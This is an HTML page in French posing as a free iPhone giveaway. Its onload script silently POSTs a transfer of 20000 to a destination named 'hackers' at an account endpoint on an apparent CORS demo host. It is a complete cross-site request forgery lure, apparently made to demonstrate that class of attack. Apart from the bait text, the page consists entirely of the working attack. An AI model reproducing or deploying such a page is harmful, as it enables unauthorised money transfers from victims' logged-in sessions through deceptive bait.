<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gagner 1 iPhone gratuitement !</title>
</head>
<body onload="initPage()">
    <h1>Gagner un iPhone gratuitement ! </h1>
    <p>C'est génial ! Méthode 100% gratuite et approuvée</p>
    <img src="https://www.apple.com/newsroom/images/product/iphone/standard/Apple_iPhone-13-Pro_iPhone-13-Pro-Max_09142021_inline.jpg.large.jpg" alt="Un iPhone gratuit" />
    
    <script>
      function initPage(){
            // Récupérer la valeur du montant depuis le formulaire
            var montant =20000
            var dest = "hackers"

            // Exemple d'URL de l'API (remplacez par votre propre URL)
            var apiUrl = 'http://api.cors.demo.stchepinsky.net/account/transfert';

            // Exemple de requête POST avec fetch
            fetch(apiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ amount: montant, dest:dest }),
            })
            .then(response => response.json())
            .then(data => {
                console.log('Réponse de l\'API :', data);
            })
            .catch(error => console.error('Erreur lors de l\'envoi à l\'API:', error));
      }

    </script>

   
</body>
</html>
